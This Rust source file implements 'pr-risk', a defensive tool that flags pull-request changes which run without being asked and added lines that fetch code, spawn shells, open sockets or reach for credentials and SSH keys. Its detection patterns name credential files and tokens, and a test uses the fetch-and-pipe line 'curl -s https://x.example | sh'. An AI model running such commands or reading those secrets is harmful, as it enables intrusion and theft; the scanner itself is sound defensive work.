//! `pr-risk [--files | --json] <worktree> <base>`: the first look at someone
//! else's PR, what it changes that runs without being asked, each file with
//! its added lines, before any of it is read closely or run. Ported from
//! bin/pr-risk, its kinds of file made this repository's and any Rust or
//! JavaScript repository's where the tmux version's were its own layout's
//! (tmux.conf, `lib/`, `bin/`).
//!
//! It reads git alone: the diff from `<base>`'s merge base to the
//! worktree's HEAD, with no hook, external diff or textconv (all of which
//! config alone could name), no file-system monitor, and as text whatever
//! the PR's `.gitattributes` say, so a `-diff` there hides nothing. Nothing
//! of the PR's runs. Its file names and lines are printed with their
//! control characters written out (`shown`), so no escape sequence of the
//! author's reaches your terminal; `--json` keeps them, escaped.
//!
//!   build     `build.rs`, `Cargo.toml` and `Cargo.lock` (a build script, a
//!             proc macro or a dependency, whose own run as cargo builds,
//!             checks or tests, or an editor's rust-analyzer opens the
//!             folder), `.cargo/` (a rustc wrapper, a runner) and
//!             `rust-toolchain(.toml)` (the toolchain rustup fetches, or one
//!             of its own by path), anywhere
//!   git       what git runs or reads in the worktree: `.githooks/`,
//!             `.husky/`, hook managers' files, `.gitattributes` (which
//!             picks among the filters and diff drivers your config names)
//!             and `.gitmodules`
//!   setup     `install.sh`, and `src/setup/`: what setup writes into your
//!             home and Claude Code's settings on install and a new build's
//!             first run
//!   claude    what a Claude session loads or runs: `.claude/`,
//!             `CLAUDE.md` and `AGENTS.md` anywhere, `.mcp.json`, and the
//!             plugin's settings, skills and instructions
//!             (`assets/claude-settings.json`, `assets/skills/`,
//!             `assets/switchboard.md`)
//!   ci        `.github/workflows/` and `.github/actions/`, which GitHub runs
//!             with the repository's secrets
//!   packages  package manifests, lockfiles and package managers' settings
//!             anywhere (npm, Yarn, pnpm, Bun, Bundler, pip, Poetry, uv, Go):
//!             a new or changed dependency, or an install script
//!
//! Then every added line, in any file, that fetches, evaluates, runs a
//! shell, decodes, runs AppleScript, asks the Keychain, reaches for
//! credentials or SSH keys, opens a socket, or changes what git runs (its
//! hooks path among them), and the host names the PR adds that the base
//! names nowhere.
//!
//!   --files   the files alone, a line each: `<kind>  <status> <path>`
//!   --json    `{ base, mergeBase, files: [{ kind, status, path, added:
//!             [{ line, text }] }], hits: [{ file, line, what, text }],
//!             hosts: [] }`
//!
//! `wtpr --untrusted` prints `--files` for the PR it checks out.

use std::collections::BTreeSet;
use std::path::Path;
use std::process::{Command, ExitCode, Stdio};
use std::sync::LazyLock;

use regex::Regex;
use serde_json::{Value, json};

use crate::util;

/// What kind of thing a file is that runs without being asked.
#[derive(Clone, Copy, Debug, PartialEq, Eq)]
pub enum Kind {
    Build,
    Git,
    Setup,
    Claude,
    Ci,
    Packages,
}

impl Kind {
    /// In the order the report lists them.
    pub const ALL: [Kind; 6] = [
        Kind::Git,
        Kind::Setup,
        Kind::Claude,
        Kind::Build,
        Kind::Ci,
        Kind::Packages,
    ];

    pub fn name(self) -> &'static str {
        match self {
            Kind::Build => "build",
            Kind::Git => "git",
            Kind::Setup => "setup",
            Kind::Claude => "claude",
            Kind::Ci => "ci",
            Kind::Packages => "packages",
        }
    }

    fn title(self) -> &'static str {
        match self {
            Kind::Git => "Run or read by git in the worktree (hooks, filters, submodules)",
            Kind::Setup => "Runs on install and setup",
            Kind::Claude => "Loaded or run by a Claude session",
            Kind::Build => {
                "Runs as it builds (cargo build, check, test or clippy, and an editor's rust-analyzer)"
            }
            Kind::Ci => "Runs in CI, with the repository's secrets",
            Kind::Packages => "Packages (dependencies, install scripts)",
        }
    }
}

static GIT_FILES: LazyLock<Regex> = LazyLock::new(|| {
    Regex::new(r"^(\.githooks|\.husky)/|(^|/)\.gitattributes$|^\.gitmodules$|^(\.pre-commit-config\.yaml|\.?lefthook\.ya?ml)$").unwrap()
});
static SETUP_FILES: LazyLock<Regex> =
    LazyLock::new(|| Regex::new(r"^(install\.sh|src/setup/.+)$").unwrap());
static CLAUDE_FILES: LazyLock<Regex> = LazyLock::new(|| {
    Regex::new(r"^\.claude/|(^|/)(CLAUDE|AGENTS|CLAUDE\.local)\.md$|^\.mcp\.json$|^\.claude-plugin/|^assets/(claude-settings\.json|switchboard\.md|skills/)").unwrap()
});
static BUILD_FILES: LazyLock<Regex> = LazyLock::new(|| {
    Regex::new(r"(^|/)(build\.rs|Cargo\.toml|Cargo\.lock|rust-toolchain|rust-toolchain\.toml)$|(^|/)\.cargo/").unwrap()
});
static CI_FILES: LazyLock<Regex> =
    LazyLock::new(|| Regex::new(r"^\.github/(workflows|actions)/").unwrap());
static PACKAGE_FILES: LazyLock<Regex> = LazyLock::new(|| {
    Regex::new(r"(^|/)(package\.json|package-lock\.json|npm-shrinkwrap\.json|yarn\.lock|pnpm-lock\.yaml|pnpm-workspace\.yaml|bun\.lockb?|\.npmrc|\.yarnrc|\.yarnrc\.yml|Gemfile|Gemfile\.lock|requirements[^/]*\.txt|pyproject\.toml|poetry\.lock|uv\.lock|Pipfile|Pipfile\.lock|setup\.py|setup\.cfg|go\.mod|go\.sum)$").unwrap()
});

/// The kind of a changed file that runs without being asked, or `None`.
pub fn kind_of(path: &str) -> Option<Kind> {
    [
        (Kind::Git, &*GIT_FILES),
        (Kind::Setup, &*SETUP_FILES),
        (Kind::Claude, &*CLAUDE_FILES),
        (Kind::Build, &*BUILD_FILES),
        (Kind::Ci, &*CI_FILES),
        (Kind::Packages, &*PACKAGE_FILES),
    ]
    .into_iter()
    .find(|(_, re)| re.is_match(path))
    .map(|(kind, _)| kind)
}

/// What an added line does that is worth reading first, and how it is told.
static PATTERNS: LazyLock<Vec<(&'static str, Regex)>> = LazyLock::new(|| {
    [
        (
            "fetches",
            r"\b(curl|wget)\b|\breqwest::|\bureq::|TcpStream::connect|Invoke-WebRequest",
        ),
        ("evaluates", r"\beval\b"),
        (
            "runs a shell",
            r#"\b(sh|bash|zsh)\s+-c\b|Command::new\(\s*"(/bin/)?(ba|z)?sh""#,
        ),
        ("decodes", r"\bbase64\b|\bfrom_hex\b|\bhex::decode\b"),
        ("runs AppleScript", r"\bosascript\b"),
        (
            "asks the Keychain",
            r"\bsecurity\s+(find|dump|add|delete|unlock|export|import|set)-?\w*|\bsecret-tool\b",
        ),
        ("reaches for the Keychain", r"Keychains"),
        ("reads gh's token", r"\bgh\s+auth\s+token\b"),
        (
            "reaches for credentials",
            r"\b(GH_TOKEN|GITHUB_TOKEN|LINEAR_API_KEY|ANTHROPIC_API_KEY|NPM_TOKEN|CARGO_REGISTRY_TOKEN|AWS_SECRET_ACCESS_KEY)\b|\.credentials\.json|\.netrc\b|\.git-credentials|\.aws/credentials|\.cargo/credentials|_authToken",
        ),
        ("reaches for SSH keys", r"\.ssh/|SSH_AUTH_SOCK"),
        ("opens a socket", r"/dev/(tcp|udp)/|\bnc\s+-"),
        (
            "changes what git runs",
            r"(?i)hooksPath|core\.(fsmonitor|sshCommand|pager|editor|askPass)|\bfilter\.[\w.-]+\.(smudge|clean|process)\b",
        ),
    ]
    .into_iter()
    .map(|(what, re)| (what, Regex::new(re).expect("a pattern")))
    .collect()
});

static HOST: LazyLock<Regex> = LazyLock::new(|| {
    Regex::new(r"(?i)\bhttps?://([a-z0-9.-]+\.[a-z]{2,})(?::\d+)?").expect("a pattern")
});

/// An added line: its number in the PR's file, and its text.
#[derive(Clone, Debug, PartialEq, Eq)]
pub struct Added {
    pub line: u64,
    pub text: String,
}

/// A changed file that runs without being asked.
#[derive(Clone, Debug, PartialEq, Eq)]
pub struct File {
    pub kind: Kind,
    /// git's letter for it: `A`, `M`, `D`, `T`.
    pub status: String,
    pub path: String,
    pub added: Vec<Added>,
}

/// An added line worth reading first.
#[derive(Clone, Debug, PartialEq, Eq)]
pub struct Hit {
    pub file: String,
    pub line: u64,
    pub what: &'static str,
    pub text: String,
}

/// What `pr-risk` found.
#[derive(Clone, Debug, PartialEq, Eq)]
pub struct Report {
    pub base: String,
    pub merge_base: String,
    pub files: Vec<File>,
    pub hits: Vec<Hit>,
    /// The hosts the PR names that the base names nowhere, sorted.
    pub hosts: Vec<String>,
}

/// git in the worktree with nothing of the PR's or yours run: no hook, no
/// file-system monitor, paths printed as they are, `a/` and `b/` prefixes.
/// Its output's bytes; the error is git's own words.
fn git(worktree: &Path, args: &[&str]) -> Result<Vec<u8>, String> {
    let output = Command::new("git")
        .args([
            "-c",
            "core.hooksPath=/dev/null",
            "-c",
            "core.fsmonitor=false",
            "-c",
            "core.quotePath=false",
            "-c",
            "diff.noprefix=false",
            "-c",
            "diff.mnemonicPrefix=false",
            "-c",
            "diff.relative=false",
        ])
        .arg("-C")
        .arg(worktree)
        .args(args)
        .stdin(Stdio::null())
        .output()
        .map_err(|e| format!("could not run git: {e}"))?;
    if !output.status.success() {
        return Err(String::from_utf8_lossy(&output.stderr).trim().to_string());
    }
    Ok(output.stdout)
}

/// What `pr-risk` reports for the worktree against `base`.
pub fn report(worktree: &Path, base: &str) -> Result<Report, String> {
    if base.starts_with('-') {
        return Err(format!("{base} isn't a ref"));
    }
    let merge_base = git(worktree, &["merge-base", base, "HEAD"])
        .map(|out| String::from_utf8_lossy(&out).trim().to_string())
        .map_err(|e| {
            format!(
                "no merge base of {base} and HEAD in {}: {e}",
                worktree.display()
            )
        })?;
    let diff = [
        "diff",
        "--no-color",
        "--no-ext-diff",
        "--no-textconv",
        "--no-renames",
    ];
    // Each changed file with its status, NUL-separated so any name reads.
    let mut args = diff.to_vec();
    args.extend(["--name-status", "-z", &merge_base, "HEAD", "--"]);
    let listed = git(worktree, &args)?;
    let mut changed: Vec<(String, String)> = Vec::new();
    let mut fields = listed.split(|&b| b == 0).filter(|f| !f.is_empty());
    while let (Some(code), Some(path)) = (fields.next(), fields.next()) {
        changed.push((
            String::from_utf8_lossy(code).into_owned(),
            String::from_utf8_lossy(path).into_owned(),
        ));
    }
    let mut args = diff.to_vec();
    args.extend(["--text", "-U0", &merge_base, "HEAD", "--"]);
    let patch = git(worktree, &args)?;
    let added = added_lines(&String::from_utf8_lossy(&patch));

    let lines_of = |path: &str| -> Vec<Added> {
        added
            .iter()
            .find(|(p, _)| p == path)
            .map(|(_, lines)| lines.clone())
            .unwrap_or_default()
    };
    let files: Vec<File> = changed
        .iter()
        .filter_map(|(status, path)| {
            Some(File {
                kind: kind_of(path)?,
                status: status.clone(),
                path: path.clone(),
                added: lines_of(path),
            })
        })
        .collect();

    let mut hits = Vec::new();
    let mut hosts = BTreeSet::new();
    for (path, lines) in &added {
        for Added { line, text } in lines {
            for (what, re) in PATTERNS.iter() {
                if re.is_match(text) {
                    hits.push(Hit {
                        file: path.clone(),
                        line: *line,
                        what,
                        text: text.trim().to_string(),
                    });
                }
            }
            for m in HOST.captures_iter(text) {
                hosts.insert(m[1].to_lowercase());
            }
        }
    }
    // A host is new when the base names it nowhere, as text in any file.
    let hosts = hosts
        .into_iter()
        .filter(|host| {
            git(
                worktree,
                &[
                    "grep",
                    "-q",
                    "-F",
                    "-i",
                    "--no-textconv",
                    "-e",
                    host,
                    &merge_base,
                    "--",
                ],
            )
            .is_err()
        })
        .collect();
    Ok(Report {
        base: base.to_string(),
        merge_base,
        files,
        hits,
        hosts,
    })
}

/// The added lines of a `-U0` diff, by file, in the diff's order, each with
/// its line number in the new file. A `+++ ` line names the file only in a
/// file's header, before its first hunk: inside one it is an added line
/// beginning `++`.
pub fn added_lines(patch: &str) -> Vec<(String, Vec<Added>)> {
    static HUNK: LazyLock<Regex> =
        LazyLock::new(|| Regex::new(r"^@@ -\d+(?:,\d+)? \+(\d+)").unwrap());
    let mut out: Vec<(String, Vec<Added>)> = Vec::new();
    let mut file: Option<usize> = None;
    let mut at = 0u64;
    let mut in_header = false;
    for line in patch.split('\n') {
        if line.starts_with("diff --git ") {
            in_header = true;
            file = None;
            continue;
        }
        if in_header && let Some(name) = line.strip_prefix("+++ ") {
            file = (name != "/dev/null").then(|| {
                let name = unquote(name);
                let name = name.strip_prefix("b/").unwrap_or(&name).to_string();
                out.push((name, Vec::new()));
                out.len() - 1
            });
            continue;
        }
        if let Some(m) = HUNK.captures(line) {
            in_header = false;
            at = m[1].parse().unwrap_or(0);
            continue;
        }
        if in_header {
            continue;
        }
        if let (Some(i), Some(text)) = (file, line.strip_prefix('+')) {
            out[i].1.push(Added {
                line: at,
                text: text.to_string(),
            });
            at += 1;
        }
    }
    out
}

/// A path as git writes it in a diff's header: quoted, with C's escapes,
/// when it holds a quote, a backslash or a control character.
fn unquote(name: &str) -> String {
    let Some(inner) = name.strip_prefix('"').and_then(|n| n.strip_suffix('"')) else {
        return name.to_string();
    };
    let bytes = inner.as_bytes();
    let mut out = Vec::with_capacity(bytes.len());
    let mut i = 0;
    while i < bytes.len() {
        if bytes[i] != b'\\' || i + 1 >= bytes.len() {
            out.push(bytes[i]);
            i += 1;
            continue;
        }
        let next = bytes[i + 1];
        let simple = match next {
            b'n' => Some(b'\n'),
            b't' => Some(b'\t'),
            b'r' => Some(b'\r'),
            b'a' => Some(7),
            b'b' => Some(8),
            b'f' => Some(12),
            b'v' => Some(11),
            b'"' => Some(b'"'),
            b'\\' => Some(b'\\'),
            _ => None,
        };
        if let Some(b) = simple {
            out.push(b);
            i += 2;
        } else if bytes.len() >= i + 4
            && bytes[i + 1..i + 4]
                .iter()
                .all(|b| (b'0'..=b'7').contains(b))
        {
            let n = bytes[i + 1..i + 4]
                .iter()
                .fold(0u32, |n, d| n * 8 + u32::from(d - b'0'));
            out.push(n as u8);
            i += 4;
        } else {
            out.push(bytes[i]);
            i += 1;
        }
    }
    String::from_utf8_lossy(&out).into_owned()
}

/// The PR's text as the report shows it in a terminal: every control
/// character but a tab written out (`^[` for escape, `<U+009B>` for one
/// past ASCII), since the PR's author chose it, and a terminal takes an
/// escape sequence in it as an instruction (one sets the clipboard). The
/// JSON keeps the text as it is, escaped.
pub fn shown(text: &str) -> String {
    let mut out = String::with_capacity(text.len());
    for c in text.chars() {
        match c {
            '\t' => out.push(c),
            '\u{7f}' => out.push_str("^?"),
            c if (c as u32) < 0x20 => {
                out.push('^');
                out.push(char::from(c as u8 + 0x40));
            }
            c if c.is_control() => out.push_str(&format!("<U+{:04X}>", c as u32)),
            c => out.push(c),
        }
    }
    out
}

/// How many of a file's added lines the report shows.
const SHOWN: usize = 40;

/// The report as text, under a heading a kind, then the lines to read first
/// and the new hosts.
pub fn text(report: &Report) -> String {
    let mut out: Vec<String> = Vec::new();
    for kind in Kind::ALL {
        let these: Vec<&File> = report.files.iter().filter(|f| f.kind == kind).collect();
        if these.is_empty() {
            continue;
        }
        out.push(format!("## {}", kind.title()));
        out.push(String::new());
        for f in these {
            let count = if f.added.is_empty() {
                String::new()
            } else {
                format!(" (+{})", f.added.len())
            };
            out.push(format!("{} {}{count}", f.status, shown(&f.path)));
            for a in f.added.iter().take(SHOWN) {
                out.push(format!("  {:>5}  {}", a.line, shown(&a.text)));
            }
            if f.added.len() > SHOWN {
                out.push(format!("  … {} more added lines", f.added.len() - SHOWN));
            }
        }
        out.push(String::new());
    }
    if !report.hits.is_empty() {
        out.push("## Added lines to read first".into());
        out.push(String::new());
        for h in &report.hits {
            out.push(format!(
                "{}:{}  {}: {}",
                shown(&h.file),
                h.line,
                h.what,
                shown(&h.text)
            ));
        }
        out.push(String::new());
    }
    if !report.hosts.is_empty() {
        out.push("## Hosts the base names nowhere".into());
        out.push(String::new());
        out.extend(report.hosts.iter().cloned());
        out.push(String::new());
    }
    if out.is_empty() {
        return format!(
            "Nothing that runs without being asked changed between {} and HEAD, and no added line matched what pr-risk looks for; the rest of the change still needs reading.",
            report.base
        );
    }
    out.join("\n").trim_end().to_string()
}

/// The files alone, a line each, as `--files` prints them.
pub fn file_lines(report: &Report) -> Vec<String> {
    report
        .files
        .iter()
        .map(|f| format!("{:<9} {} {}", f.kind.name(), f.status, shown(&f.path)))
        .collect()
}

/// The report as `--json` prints it.
pub fn to_json(report: &Report) -> Value {
    json!({
        "base": report.base,
        "mergeBase": report.merge_base,
        "files": report.files.iter().map(|f| json!({
            "kind": f.kind.name(),
            "status": f.status,
            "path": f.path,
            "added": f.added.iter().map(|a| json!({ "line": a.line, "text": a.text })).collect::<Vec<_>>(),
        })).collect::<Vec<_>>(),
        "hits": report.hits.iter().map(|h| json!({
            "file": h.file,
            "line": h.line,
            "what": h.what,
            "text": h.text,
        })).collect::<Vec<_>>(),
        "hosts": report.hosts,
    })
}

const USAGE: &str = "Usage: switchboard pr-risk [--files | --json] <worktree> <base>

What someone else's PR changes that runs without being asked (git's hooks and
attributes, setup, what Claude loads, the build, CI, packages), each file with
its added lines; then the added lines that fetch, evaluate, decode, reach for
credentials or change what git runs, and the hosts the base names nowhere.
Read from git alone, as text, so nothing of the PR's runs.

  --files   the files alone, a line each
  --json    all of it as JSON";

pub fn main(args: Vec<String>) -> ExitCode {
    if args.iter().any(|a| a == "-h" || a == "--help") {
        println!("{USAGE}");
        return ExitCode::SUCCESS;
    }
    let files_only = args.iter().any(|a| a == "--files");
    let as_json = args.iter().any(|a| a == "--json");
    let unknown = args
        .iter()
        .find(|a| a.starts_with("--") && *a != "--files" && *a != "--json");
    let positional: Vec<&String> = args.iter().filter(|a| !a.starts_with("--")).collect();
    let ([worktree, base], None) = (positional.as_slice(), unknown) else {
        eprintln!("{USAGE}");
        return ExitCode::from(2);
    };
    let report = match report(Path::new(worktree.as_str()), base) {
        Ok(report) => report,
        Err(e) => {
            eprintln!("pr-risk: {e}");
            return ExitCode::from(1);
        }
    };
    if as_json {
        println!("{}", util::json_pretty(&to_json(&report)));
    } else if files_only {
        for line in file_lines(&report) {
            println!("{line}");
        }
    } else {
        println!("{}", text(&report));
    }
    ExitCode::SUCCESS
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn files_that_run_unasked_are_known_by_their_paths() {
        for (path, kind) in [
            (".githooks/pre-push", Some(Kind::Git)),
            ("sub/.gitattributes", Some(Kind::Git)),
            (".gitmodules", Some(Kind::Git)),
            ("install.sh", Some(Kind::Setup)),
            ("src/setup/plugin.rs", Some(Kind::Setup)),
            (".claude/settings.json", Some(Kind::Claude)),
            ("docs/CLAUDE.md", Some(Kind::Claude)),
            ("AGENTS.md", Some(Kind::Claude)),
            (".mcp.json", Some(Kind::Claude)),
            ("assets/claude-settings.json", Some(Kind::Claude)),
            ("assets/skills/wt/SKILL.md", Some(Kind::Claude)),
            ("assets/switchboard.md", Some(Kind::Claude)),
            ("build.rs", Some(Kind::Build)),
            ("crates/x/build.rs", Some(Kind::Build)),
            ("Cargo.toml", Some(Kind::Build)),
            ("Cargo.lock", Some(Kind::Build)),
            (".cargo/config.toml", Some(Kind::Build)),
            ("rust-toolchain.toml", Some(Kind::Build)),
            (".github/workflows/ci.yml", Some(Kind::Ci)),
            ("web/package.json", Some(Kind::Packages)),
            (
                "assets/skills/x/scripts/package-lock.json",
                Some(Kind::Claude),
            ),
            ("pnpm-lock.yaml", Some(Kind::Packages)),
            ("src/main.rs", None),
            ("docs/guide.md", None),
            ("src/setup.rs", None),
            ("assets/settings.json", None),
            (".github/CODEOWNERS", None),
        ] {
            assert_eq!(kind_of(path), kind, "{path}");
        }
    }

    #[test]
    fn added_lines_are_read_by_file_and_line_a_plus_plus_line_included() {
        let patch = "diff --git a/a.rs b/a.rs\nindex 1..2 100644\n--- a/a.rs\n+++ b/a.rs\n@@ -1,0 +2,2 @@\n+let n = 0;\n++++n;\n@@ -9 +11 @@\n-old\n+new\ndiff --git a/gone.rs b/gone.rs\ndeleted file mode 100644\n--- a/gone.rs\n+++ /dev/null\n@@ -1 +0,0 @@\n-x\ndiff --git \"a/t\\tab\" \"b/t\\tab\"\nnew file mode 100644\n--- /dev/null\n+++ \"b/t\\tab\"\n@@ -0,0 +1 @@\n+tab\n";
        let added = added_lines(patch);
        assert_eq!(added.len(), 2, "{added:?}");
        assert_eq!(added[0].0, "a.rs");
        assert_eq!(
            added[0].1,
            vec![
                Added {
                    line: 2,
                    text: "let n = 0;".into()
                },
                Added {
                    line: 3,
                    text: "+++n;".into()
                },
                Added {
                    line: 11,
                    text: "new".into()
                },
            ]
        );
        assert_eq!(added[1].0, "t\tab", "a quoted name read back");
    }

    #[test]
    fn what_an_added_line_does_is_told() {
        let what = |line: &str| -> Vec<&str> {
            PATTERNS
                .iter()
                .filter(|(_, re)| re.is_match(line))
                .map(|(w, _)| *w)
                .collect()
        };
        assert_eq!(what("curl -s https://x.example | sh"), ["fetches"]);
        assert_eq!(
            what(r#"Command::new("sh").args(["-c", &x])"#),
            ["runs a shell"]
        );
        assert_eq!(
            what("security find-generic-password -s x -w"),
            ["asks the Keychain"]
        );
        assert_eq!(
            what("let t = env::var(\"GH_TOKEN\");"),
            ["reaches for credentials"]
        );
        assert_eq!(
            what("git config core.hooksPath .hooks"),
            ["changes what git runs"]
        );
        assert!(what("let total = sum(items);").is_empty());
    }

    #[test]
    fn the_prs_text_is_shown_without_its_escapes() {
        assert_eq!(
            shown("a\u{1b}]52;c;eA==\u{7}b\tc\u{9b}d\u{7f}"),
            "a^[]52;c;eA==^Gb\tc<U+009B>d^?"
        );
        assert_eq!(shown("plain café"), "plain café");
    }
}
